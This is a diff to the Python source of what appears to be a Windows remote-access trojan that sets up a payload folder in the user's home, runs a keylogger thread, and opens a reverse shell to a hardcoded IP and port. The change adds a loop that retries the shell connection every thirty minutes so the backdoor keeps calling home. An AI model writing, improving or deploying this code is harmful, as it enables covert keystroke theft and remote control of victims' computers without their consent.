@@ -9,9 +9,9 @@ import pyautogui
 from cv2 import *
 from swinlnk.swinlnk import SWinLnk
 from shutil import copyfile
+import time
 
-
-# Erster Start
+# First Start
 if not os.path.exists('C:\\Users\\'+getpass.getuser()+'\\payload'):
     os.makedirs('C:\\Users\\'+getpass.getuser()+'\\payload')
     pfad_to_payload_files='C:\\Users\\'+getpass.getuser()+'\\payload_files'
@@ -29,8 +29,15 @@ thread_keylogger.start()
 
 # Shell
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.178.29",50000))                               # You IP and Port!
 
+# Try to connect
+while True:
+    try:
+        s.connect(("192.168.178.29",50000))                               # You IP and Port!
+        break
+    except:
+        time.sleep(1800)
+        continue
 
 try:
     while True:
